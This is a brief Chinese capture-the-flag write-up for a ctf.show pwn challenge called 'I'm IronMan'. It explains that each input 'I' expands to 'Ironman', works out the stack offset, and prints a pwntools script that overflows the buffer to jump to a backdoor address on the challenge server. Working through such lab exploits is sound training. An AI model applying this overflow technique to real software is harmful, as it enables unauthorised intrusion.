# 挑战简介
I‘m IronMan

# 思路
从这边的题开始，就不再是基础的普及了，而是比赛中会遇到的题

此题读取输入时，读取到'I'则会输出ironman，也就是说一个I=Ironman 7个字符  

而offset=0x6c+0x8

所以  
```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

p= remote("pwn.challenge.ctf.show",28151)
elf = ELF('.\pwn')

back_room = p32(0x804902E)

payload = b'I'*0x10 + back_room

print(payload)

p.sendline(payload)

p.interactive()

```
